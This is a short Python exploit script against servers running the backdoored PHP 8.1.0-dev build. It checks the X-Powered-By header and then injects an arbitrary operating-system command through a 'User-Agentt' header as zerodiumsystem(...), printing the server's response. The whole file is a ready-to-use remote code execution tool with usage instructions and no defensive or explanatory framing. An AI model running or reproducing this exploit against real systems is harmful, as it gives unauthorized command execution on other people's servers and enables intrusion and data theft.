import requests
import sys
import re
import cmd

proxies = {
    'http': 'http://127.0.0.1:8080'
}


def check_header(url):
    resp = requests.get(url)
    if resp.headers['X-Powered-By'] == 'PHP/8.1.0-dev':
        return True
    else:
        return False


def send_Cmd(url, cmd):
	prompt = 'Zerodium> '
	pattern = re.compile("<.*html.*>")
	payload = {
        'User-Agentt': f'zerodiumsystem(\'{cmd}\');'
		}
	resp = requests.get(url, headers=payload)
	output = pattern.split(resp.text)[0]
	print(output.strip())
		
if __name__ == '__main__':
    try:
        url = sys.argv[1].strip('/')
        cmd = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> \"<OS command>\"" % sys.argv[0])
        print("[-] Example: %s http://example.com/ whoami" % sys.argv[0])
        sys.exit(-1)

    if check_header(url):
        send_Cmd(url, cmd)
    else:
        sys.exit(-1)
